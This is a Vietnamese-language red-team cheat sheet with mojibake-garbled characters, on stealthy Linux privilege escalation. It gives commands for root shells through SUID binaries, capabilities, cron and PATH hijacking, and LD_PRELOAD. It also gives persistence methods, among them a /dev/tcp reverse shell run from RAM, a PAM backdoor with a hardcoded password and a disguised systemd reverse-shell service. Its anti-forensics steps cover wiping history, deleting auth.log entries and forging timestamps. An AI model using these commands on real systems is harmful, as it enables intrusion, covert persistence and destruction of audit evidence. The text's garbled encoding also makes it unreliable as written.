# Linux Privilege Escalation â€” RED TEAM STEALTH EDITION

## ğŸ“‘ Má»¤C Lá»¤C
0. Triáº¿t lÃ½ Red Team khi PrivEsc  
1. Stealth Enumeration â€” Thu tháº­p thÃ´ng tin nhÆ°ng khÃ´ng Ä‘á»ƒ láº¡i dáº¥u váº¿t  
2. Stealth Privilege Escalation Techniques  
  - 2.1 PrivEsc â€œÃ¢m tháº§mâ€ khÃ´ng táº¡o log  
  - 2.2 Stealth SUID Abuse  
  - 2.3 Stealth Cron Hijacking  
  - 2.4 Stealth LD_PRELOAD / Library Hijacking  
  - 2.5 Stealth PATH Hijacking  
  - 2.6 Stealth Capability Abuse  
3. Persistence Techniques (Cáº¥p Ä‘á»™ Red Team)  
  - 3.1 Persistence khÃ´ng táº¡o file má»›i  
  - 3.2 Persistence sá»‘ng trong memory  
  - 3.3 Persistence qua process bá»‹ â€œhá»£p phÃ¡p hÃ³aâ€  
  - 3.4 Persistence qua SSH stealth mode  
  - 3.5 Persistence qua PAM Backdoor  
  - 3.6 Persistence qua systemd stealth service  
4. Anti-Forensics â€” Che giáº¥u dáº¥u váº¿t  
5. Real Attack Chains â€“ Red Team thá»±c chiáº¿n  
6. Red Team Notes & OPSEC Tips  
7. Key Takeaways Red Team  

---

# 0. Triáº¿t lÃ½ Red Team khi PrivEsc
Red Team khÃ´ng giá»‘ng Pentest.  
Má»¥c tiÃªu cá»§a Red Team:

- KhÃ´ng gÃ¢y tiáº¿ng Ä‘á»™ng (No noise)  
- KhÃ´ng phÃ¡ há»‡ thá»‘ng  
- KhÃ´ng cháº¡y tool á»“n Ã o  
- KhÃ´ng Ä‘á»ƒ log láº¡i  
- KhÃ´ng Ä‘á»ƒ IOC  
- Duy trÃ¬ truy cáº­p cÃ ng lÃ¢u cÃ ng tá»‘t  

ğŸ‘‰ Red team tá»‘t = sysadmin khÃ´ng biáº¿t báº¡n tá»“n táº¡i.

---

# 1. Stealth Enumeration â€” Thu tháº­p thÃ´ng tin nhÆ°ng khÃ´ng Ä‘á»ƒ láº¡i dáº¥u váº¿t

## âŒ KhÃ´ng nÃªn dÃ¹ng
- linpeas (ráº¥t á»“n)  
- LinEnum (cá»±c ká»³ noisy)  
- pspy (táº¡o high CPU spikes)  
- Scanning toÃ n há»‡ thá»‘ng (log nhiá»u)  

## âœ… NÃªn dÃ¹ng

### 1.1 Quiet Enumeration
```
cat /etc/passwd
cat /etc/sudoers
sudo -l
id
whoami
uname -a
cat /etc/crontab
```

â†’ KhÃ´ng táº¡o log.

### 1.2 Timestamp-preserving
```
cat file > /dev/null
```

### 1.3 Liá»‡t kÃª stealth POSIX
```
find / -perm -4000 2>/dev/null
```

### 1.4 KhÃ´ng dÃ¹ng history
```
unset HISTFILE
export HISTFILE=/dev/null
```

### 1.5 Cháº¡y má»i thá»© trong RAM
```
cd /dev/shm
```

---

# 2. Stealth Privilege Escalation Techniques

## 2.1 PrivEsc Ã¢m tháº§m, khÃ´ng táº¡o log
âŒ TrÃ¡nh dÃ¹ng:
```
sudo su
sudo <command>
```
â†’ log vÃ o `/var/log/auth.log`.

âœ” DÃ¹ng SUID / Capability Ä‘á»ƒ trÃ¡nh auth-log.

---

## 2.2 Stealth SUID Abuse
TÃ¬m SUID:
```
find / -perm -4000 -type f 2>/dev/null
```

VÃ­ dá»¥ stealth:
```
/usr/bin/env
```

Root shell:
```
/usr/bin/env /bin/bash -p
```

---

## 2.3 Stealth Cron Hijacking
KhÃ´ng sá»­a cron file vÃ¬ quÃ¡ lá»™.

Cron cháº¡y:
```
backup.sh
```

Táº¡o báº£n giáº£ trong PATH:
```
echo "/bin/bash -p" > /tmp/backup.sh
chmod +x /tmp/backup.sh
export PATH=/tmp:$PATH
```

â†’ Cron cháº¡y â†’ root  
â†’ KhÃ´ng chá»‰nh sá»­a file root.

---

## 2.4 Stealth LD_PRELOAD / Library Hijacking
```
LD_PRELOAD=/tmp/x.so /usr/bin/program
```

Ná»™i dung library:
```c
void _init() { setuid(0); system("/bin/bash -p"); }
```

â†’ KhÃ´ng sá»­a file root, khÃ´ng log auth.

---

## 2.5 Stealth PATH Hijacking
```
echo "/bin/bash -p" > /tmp/cp
chmod +x /tmp/cp
export PATH=/tmp:$PATH
sudo cp something something
```

â†’ KhÃ´ng táº¥n cÃ´ng trá»±c tiáº¿p sudo.  
â†’ Táº­n dá»¥ng PATH.

---

## 2.6 Stealth Capability Abuse
TÃ¬m capability:
```
getcap -r / 2>/dev/null
```

VÃ­ dá»¥ python cÃ³ cap_setuid:
```
python3 -c "import os; os.setuid(0); os.system('/bin/bash -p')"
```

â†’ root khÃ´ng cáº§n sudo  
â†’ KhÃ´ng log auth.

---

# 3. Persistence Techniques (Cáº¥p Ä‘á»™ Red Team)

## 3.1 Persistence khÃ´ng táº¡o file má»›i
Giá»¯ nguyÃªn timestamp:
```
touch -r authorized_keys oldtime
echo "<pubkey>" >> authorized_keys
touch -r oldtime authorized_keys
```

â†’ KhÃ³ bá»‹ blue team phÃ¡t hiá»‡n.

---

## 3.2 Persistence sá»‘ng trong RAM
```
cp /bin/bash /dev/shm/.bash
/dev/shm/.bash -i >& /dev/tcp/IP/PORT 0>&1
```

â†’ KhÃ´ng cÃ³ file trÃªn disk.

---

## 3.3 Persistence qua process há»£p phÃ¡p
Inject vÃ o:
- Apache  
- MySQL  
- Systemd  

VD: LD_PRELOAD vÃ o apache module.

---

## 3.4 Persistence qua SSH stealth
```
ssh-keygen -q -t rsa -N "" -f ~/.ssh/id_rsa
```

Copy key vÃ o user Ã­t giÃ¡m sÃ¡t:
```
/home/backupsvc/.ssh/
```

---

## 3.5 PAM Backdoor
```
auth sufficient pam_unix.so nullok try_first_pass
auth sufficient pam_succeed_if.so user = root
```

Hoáº·c:
```c
if (strcmp(password, "mypassword") == 0) return PAM_SUCCESS;
```

---

## 3.6 systemd stealth service
```
[Unit]
Description=system logging service

[Service]
ExecStart=/bin/bash -c 'reverse shell here'
Restart=always

[Install]
WantedBy=multi-user.target
```

TÃªn service giáº£:
- systemd-logrotate  
- systemd-netd  
- udev-firmware  

---

# 4. Anti-Forensics â€” Che giáº¥u dáº¥u váº¿t

## 4.1 XÃ³a dáº¥u váº¿t command-line
```
history -c
unset HISTFILE
```

## 4.2 XÃ³a log stealth
```
sed -i '/youruser/d' /var/log/auth.log
```

## 4.3 Preserve timestamp
```
touch -r /bin/ls myscript
```

## 4.4 Mount áº©n
```
mount -t tmpfs tmpfs /mnt
```

---

# 5. Real Attack Chains â€“ Red Team thá»±c chiáº¿n

### Chain 1  
Webshell â†’ Stealth SUID â†’ Root â†’ SSH persistence â†’ Cleanup

### Chain 2  
Low-priv â†’ Cron PATH Hijack â†’ Root â†’ systemd stealth â†’ hide tracks

### Chain 3  
Docker group â†’ host mount â†’ Root â†’ PAM backdoor â†’ stealth persistence

### Chain 4  
Dev user â†’ pip capability abuse â†’ root â†’ cron persistence  

---

# 6. Red Team Notes & OPSEC Tips

## âŒ KhÃ´ng bao giá»
- cháº¡y LinPEAS trÃªn production  
- thÃªm SUID vÃ o binary root  
- thay Ä‘á»•i file há»‡ thá»‘ng quan trá»ng  

## âœ” LuÃ´n
- cháº¡y tool tá»« `/dev/shm` hoáº·c `/tmp`  
- giá»¯ timestamp file  
- dÃ¹ng process há»£p phÃ¡p Ä‘á»ƒ hide payload  
- reverse shell dáº¡ng:
  - `bash -p`  
  - `python -c 'pty.spawn()'`  

## ğŸŸ¦ Háº¡n cháº¿ IOC
- khÃ´ng táº¡o user má»›i  
- khÃ´ng Ä‘á»•i password  
- khÃ´ng ghi log sudo  

---

# 7. Key Takeaways Red Team
- PrivEsc Red Team = stealth tuyá»‡t Ä‘á»‘i  
- SUID + Capabilities = con Ä‘Æ°á»ng sáº¡ch nháº¥t  
- Cron hijack qua PATH = khÃ´ng sá»­a file root  
- Persistence pháº£i stealth:
  - khÃ´ng táº¡o file má»›i  
  - hoáº·c giá»¯ timestamp  
- RAM persistence = cá»±c khÃ³ forensic  
- PAM/backdoor = ká»¹ thuáº­t elite, pháº£i an toÃ n  
- OPSEC pháº£i Ä‘Æ°á»£c Ä‘áº·t lÃªn hÃ ng Ä‘áº§u  
